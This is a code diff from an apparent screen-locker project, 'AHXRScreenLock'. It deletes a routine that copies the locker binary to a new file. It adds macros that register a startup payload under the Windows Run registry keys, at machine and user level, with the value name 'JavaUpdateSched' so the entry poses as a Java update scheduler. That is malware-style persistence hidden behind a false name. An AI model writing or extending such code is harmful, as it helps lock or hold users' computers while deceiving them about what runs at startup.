@@ -20,33 +20,13 @@
 	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
 */
 //=======================================================
-#include <string>
-#include <fstream>
+#define KEY_TARGET						HKEY_LOCAL_MACHINE
+#define KEY_NON_ADMIN_TARGET			HKEY_CURRENT_USER
+#define KEY_STARTUP						"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+#define KEY_NON_ADMIN_STARTUP			"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+#define KEY_VALUE_NAME					"JavaUpdateSched"
 
-#include "settings.h"
-#include "pack.h"
+#define	STARTUP_PAYLOAD()				{createStartupData();}
 
-using namespace std;
-
-string LOCKER_FILE_NAME;
-
-void buildNewLocker(string fileName) {
-	ifstream
-		f_old;
-	ofstream
-		f_new;
-
-	puts(LOCKER_FILE_NAME.c_str());
-
-	f_old.open(LOCKER_FILE_NAME, ios::binary);
-	f_new.open(fileName, ios::binary);
-
-	f_new << f_old.rdbuf();
-
-	f_old.close();
-	f_new.close();
-}
-
-void setLockerFileName(string name) {
-	LOCKER_FILE_NAME = name;
-}
+extern void								createStartupData();
+extern bool								isStartupRegistered();
